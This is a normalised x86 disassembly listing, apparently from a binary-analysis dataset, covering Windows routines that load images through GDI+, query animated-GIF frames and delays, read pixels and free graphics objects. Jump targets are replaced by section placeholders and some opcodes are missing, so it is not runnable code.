je r-xdata
push eax
push 0x2
call [ GlobalAlloc@IAT ]
mov [ edi + 0x28 ] eax
test eax eax
je r-xdata
xor edx edx
mov edx [ esi + 0xc ]
jmp r-xdata
mov ecx [ edi + 0x28 ]
push ecx
call [ GlobalUnlock@IAT ]
push esi
call sub_440600
add esp 0x4
mov [ edi + 0x24 ] eax
test eax eax
je r-xdata
push edx
push ecx
push eax
call memcpy
mov eax [ edi + 0x28 ]
add esp 0xc
lea esi [ edi + 0x2c ]
push esi
push 0x0
push eax
call [ CreateStreamOnHGlobal@IAT ]
mov esi [ esi ]
test esi esi
je r-xdata
mov esi eax
call sub_4400c0
mov esi [ edi + 0x24 ]
mov [ edi + 0xc ] eax
call sub_440090
mov [ edi + 0x10 ] eax
sub_4404d0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push esi
call eax
sub_440510
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push esi
call eax
sub_440550
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0xc
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
push esi
call eax
sub_440590
push ebp
mov ebp esp
push 0xffffffff
push sub_444e68
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ GdipDisposeImage@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ GdipFree@IAT ]
sub_440600
push ebp
mov ebp esp
push 0xffffffff
push sub_445690
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x10
call [ GdipAlloc@IAT ]
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
mov [ esi ] r--data
mov [ ebp - 0x10 ] 0x0
call [ GdipCreateBitmapFromStream@IAT ]
mov edx [ ebp - 0x10 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] edx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_4406b0
push ebp
mov ebp esp
push 0xffffffff
push sub_444e43
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov edx 0x1
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x20 ] edx
mov [ eax + 0x18 ] dl
mov [ eax + 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ eax ] r--data
mov [ eax + 0x28 ] r--data
mov [ eax + 0x2c ] ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x34 ] ecx
mov [ ebp - 0x4 ] dl
mov [ eax + 0x8 ] edx
mov [ eax + 0x24 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_440740
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_440770
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_440770
push ebp
mov ebp esp
push 0xffffffff
push sub_445663
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x1
mov esi [ edi + 0x24 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ edi + 0x28 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi ] 0x0
mov ebx [ DeleteObject@IAT ]
je r-xdata
mov esi [ edi + 0x24 ]
test esi esi
je r-xdata
mov eax [ esi ]
push eax
call ebx
test eax eax
je r-xdata
mov [ edi + 0x24 ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
push esi
call [ operator delete@IAT ]
add esp 0x4
push eax
call ebx
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_440820
push esi
push edi
mov edi ecx
mov esi [ edi + 0x24 ]
test esi esi
je r-xdata
pop edi
pop esi
retn
cmp [ esi ] 0x0
push ebx
mov ebx [ DeleteObject@IAT ]
je r-xdata
mov esi [ edi + 0x24 ]
test esi esi
je r-xdata
mov eax [ esi ]
push eax
call ebx
test eax eax
je r-xdata
mov [ edi + 0x24 ] 0x0
pop ebx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
push esi
call [ operator delete@IAT ]
add esp 0x4
push eax
call ebx
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_440880
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x24 ]
call edx
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
jmp r-xdata
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x34 ] 0x0
test eax eax
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ esi + 0x2c ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x30 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x34 ] eax
sub_4408f0
push ebp
mov ebp esp
push 0xffffffff
push sub_44562c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x0
call [ GetDC@IAT ]
mov edx [ ebx + 0x8 ]
mov edi eax
mov [ ebp + 0x8 ] edi
test edx edx
je r-xdata
xor eax eax
mov eax [ ebx + 0xc ]
jmp r-xdata
push edi
push 0x0
call [ ReleaseDC@IAT ]
push 0x4
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
mov ecx [ esi + 0x34 ]
push ecx
mov ecx [ esi + 0x30 ]
push ecx
mov ecx [ esi + 0x2c ]
push ecx
push eax
mov ecx edi
call sub_443250
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x24 ] edi
mov eax [ edi ]
test eax eax
je r-xdata
mov [ eax ] edi
mov edi eax
mov [ edi ] ebx
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push 0x18
push ecx
call [ GetObjectW@IAT ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov edi [ ebp + 0x8 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] eax
cmp eax ebx
je r-xdata
push eax
call [ DeleteObject@IAT ]
sub_440a00
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp edi [ esi + 0x2c ]
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebp + 0xc ]
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] ecx
mov [ esi + 0x34 ] ebx
mov eax [ ebp + 0xc ]
cmp eax [ esi + 0x30 ]
jne r-xdata
cmp ebx [ esi + 0x34 ]
je r-xdata
pop edi
pop ebx
sub_440a40
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0xc ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ esi ]
push edx
call eax
sub_440a80
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x18 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ esi ]
push edx
call eax
sub_440ac0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0xc
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ esi ]
push edx
call eax
sub_440b00
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
jne r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ebx
push ecx
mov ecx esi
call edx
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ecx [ edi + 0x10 ]
mov ecx [ ecx ]
mov esi [ SelectObject@IAT ]
push eax
push ecx
call esi
mov edx [ ebp + 0x10 ]
mov ecx [ edi + 0x10 ]
push edx
mov edx [ ecx ]
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
push edx
call [ GetPixel@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
push ebx
push ecx
call esi
mov eax [ ebp + 0x8 ]
pop ebx
pop edi
pop esi
pop ebp
retn 0xc
pop edi
or eax 0xffffffff
pop esi
pop ebp
retn 0xc
sub_440b90
push ebp
mov ebp esp
push 0xffffffff
push sub_444ef8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov edx 0x1
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x20 ] edx
mov [ eax + 0x18 ] dl
mov [ eax + 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x2
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x34 ] ecx
mov [ eax + 0x38 ] cl
mov [ eax + 0x3c ] ecx
mov [ eax + 0x40 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_440c20
push ebp
mov ebp esp
push 0xffffffff
push sub_444e08
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
call sub_440c90
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_440c90
push esi
mov esi ecx
mov eax [ esi + 0x40 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x3c ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x40 ] edi
mov eax [ esi + 0x30 ]
cmp eax edi
je r-xdata
push eax
call [ GlobalFree@IAT ]
mov [ esi + 0x3c ] edi
mov eax [ esi + 0x34 ]
cmp eax edi
je r-xdata
push eax
call [ `placement delete closure'@IAT ]
add esp 0x4
mov [ esi + 0x30 ] edi
mov ecx [ esi + 0x24 ]
cmp ecx edi
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi + 0x34 ] edi
pop edi
pop esi
retn
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x24 ] edi
sub_440d00
push ebp
mov ebp esp
push ebx
mov ebx ecx
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop ebx
pop ebp
retn 0x4
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
mov eax [ esi + 0xc ]
jmp r-xdata
push eax
call [ GlobalLock@IAT ]
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
push eax
push 0x2
call [ GlobalAlloc@IAT ]
mov [ ebx + 0x3c ] eax
test eax eax
je r-xdata
xor edx edx
mov edx [ esi + 0xc ]
jmp r-xdata
mov ecx [ ebx + 0x3c ]
push ecx
call [ GlobalUnlock@IAT ]
push edi
push 0x1
mov edi esi
call sub_4400f0
add esp 0x4
mov [ ebx + 0x24 ] eax
pop edi
test eax eax
je r-xdata
push edx
push ecx
push eax
call memcpy
mov eax [ ebx + 0x3c ]
add esp 0xc
lea esi [ ebx + 0x40 ]
push esi
push 0x1
push eax
call [ CreateStreamOnHGlobal@IAT ]
mov esi [ esi ]
test esi esi
je r-xdata
mov esi eax
call sub_4400c0
mov esi [ ebx + 0x24 ]
mov [ ebx + 0xc ] eax
call sub_440090
mov edx [ ebx ]
mov [ ebx + 0x10 ] eax
mov eax [ edx + 0x30 ]
mov ecx ebx
call eax
sub_440dc0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
cmp [ esi + 0x38 ] 0x0
mov esi [ ebp + 0x14 ]
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push esi
push eax
mov eax [ edx + 0x8 ]
call eax
sub_440e10
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ esi ]
mov edx [ edx + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
mov ecx esi
call edx
sub_440e50
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop esi
pop ebp
retn 0xc
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x14 ]
push 0x1
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
mov ecx esi
call edx
sub_440e90
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x24 ]
test edi edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call [ GdipImageGetFrameDimensionsCount@IAT ]
test eax eax
je r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
xor ecx ecx
mov eax ebx
mov edx 0x10
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_443fa9
mov edi [ esi + 0x24 ]
add esp 0x4
push ebx
push eax
mov [ esi + 0x30 ] eax
mov eax [ edi + 0x4 ]
push eax
call [ GdipImageGetFrameDimensionsList@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x30 ]
mov edi [ esi + 0x24 ]
mov edx [ edi + 0x4 ]
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push edx
mov [ ebp - 0x4 ] ebx
call [ GdipImageGetFrameCount@IAT ]
cmp eax ebx
je r-xdata
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edi [ esi + 0x24 ]
lea ecx [ ebp - 0x4 ]
push ecx
mov [ esi + 0x2c ] eax
mov edx [ edi + 0x4 ]
push 0x5100
push edx
mov [ ebp - 0x4 ] ebx
call [ GdipGetPropertyItemSize@IAT ]
cmp eax ebx
je r-xdata
mov [ edi + 0x8 ] eax
mov ebx [ ebp - 0x4 ]
push ebx
call [ malloc@IAT ]
mov edi [ esi + 0x24 ]
add esp 0x4
push eax
push ebx
mov [ esi + 0x34 ] eax
mov eax [ edi + 0x4 ]
push 0x5100
push eax
call [ GdipGetPropertyItem@IAT ]
pop ebx
test eax eax
je r-xdata
mov [ edi + 0x8 ] eax
mov eax 0x1
cmp [ esi + 0x2c ] eax
jbe r-xdata
mov [ edi + 0x8 ] eax
mov [ esi + 0x38 ] al
sub_440f90
push ebp
mov ebp esp
mov eax [ ecx + 0x34 ]
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
mov edx [ eax + 0xc ]
mov ecx [ ecx + 0x28 ]
mov eax [ edx + ecx * 4 ]
lea eax [ eax + eax * 4 ]
add eax eax
pop ebp
retn 0x4
mov [ ecx + 0x28 ] 0x0
sub_440fc0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov eax [ r--data ]
mov edx [ r--data ]
mov [ ebp - 0x14 ] eax
mov eax [ r--data ]
push esi
mov esi [ ecx + 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ecx + 0x28 ]
mov [ ebp - 0x10 ] edx
mov edx [ r--data ]
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] edx
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ GdipImageSelectActiveFrame@IAT ]
test eax eax
je r-xdata
mov eax [ ecx + 0x28 ]
inc eax
xor edx edx
div [ ecx + 0x2c ]
mov [ ecx + 0x28 ] edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn
mov [ esi + 0x8 ] eax
sub_441040
push ebp
mov ebp esp
push 0xffffffff
push sub_4475f0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_441600
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x14 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x2
lea eax [ esi + 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x4
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x6
lea eax [ esi + 0x20 ]
mov [ ebp - 0x10 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x8
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x24 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0xa
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x28 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_441120
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_441150
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_441150
push ebp
mov ebp esp
push 0xffffffff
push sub_445600
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx 0x5
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov cl 0x4
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x24 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x3
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x1c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x1
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x14 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4416e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_441280
push ebp
mov ebp esp
push 0xffffffff
push sub_449938
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ esi + 0x14 ]
lea ebx [ esi + 0x14 ]
lea eax [ ecx - 0x10 ]
sub edi 0x10
cmp eax edi
je r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x14 ]
push edx
push eax
push r--data
lea edi [ ebp - 0x10 ]
call sub_401dc0
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x14 ]
push ecx
push edx
push r--data
lea edi [ esi + 0x24 ]
call sub_401dc0
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x14 ]
push eax
push ecx
push r--data
lea edi [ esi + 0x28 ]
call sub_401dc0
mov edi [ ebp - 0x10 ]
add esp 0x24
add esi 0x18
jne r-xdata
cmp [ edi + 0xc ] 0x0
jl r-xdata
push esi
mov ecx edi
call sub_441860
mov bl al
xor bl bl
jmp r-xdata
push ecx
push ebx
mov ebx [ ecx - 0xc ]
call sub_402910
mov edx [ eax ]
cmp edx [ edi ]
jne r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
call sub_4025f0
mov [ ebp + 0x8 ] eax
lea eax [ edi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov [ ebx ] ecx
jmp r-xdata
mov ecx [ edi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push edi
call eax
sub_4413b0
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov [ esi + 0x18 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
mov [ esi + 0x1c ] 0x0
mov ecx [ eax ]
